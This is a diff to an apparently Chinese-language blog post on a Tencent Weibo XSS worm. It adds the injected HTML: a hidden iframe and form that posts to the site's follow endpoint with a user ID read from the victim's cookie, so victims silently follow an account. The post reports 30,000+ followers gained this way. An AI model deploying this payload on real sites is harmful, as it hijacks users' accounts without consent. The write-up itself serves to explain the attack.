@@ -31,6 +31,16 @@ categories: security
 })()
 ```
 
+innerHTML被修改为
+
+```javascript
+<iframe style='display:none' name='mj'></iframe>
+<form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'>
+  <input type='hidden' value='" + window.u + "' name='u' />
+  <input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin' />
+</form>
+```
+
 粉丝数刷到3w+
 
 ![](http://jason5.cn/images/xss-weibo2.png)
